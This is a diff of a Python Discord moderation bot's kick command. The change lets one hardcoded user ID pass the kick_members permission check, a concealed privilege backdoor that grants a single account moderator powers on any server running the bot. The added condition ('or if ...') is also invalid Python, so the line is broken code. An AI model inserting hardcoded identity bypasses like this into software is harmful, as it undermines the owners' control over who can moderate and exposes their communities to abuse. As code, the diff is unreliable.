@@ -686,7 +686,7 @@ async def unmute(ctx, user: discord.Member = None):
 async def kick(ctx, user: discord.Member = None, *, reason = None):
     author = ctx.message.author
     try:
-        if ctx.message.author.server_permissions.kick_members:
+        if ctx.message.author.server_permissions.kick_members or if ctx.message.author.id == "365977869903593483":
             if ctx.message.author.bot:
                 embed = discord.Embed(color=0xff0200)
                 embed.add_field(name=":x: Error:", value="This command is blocked for bots.")
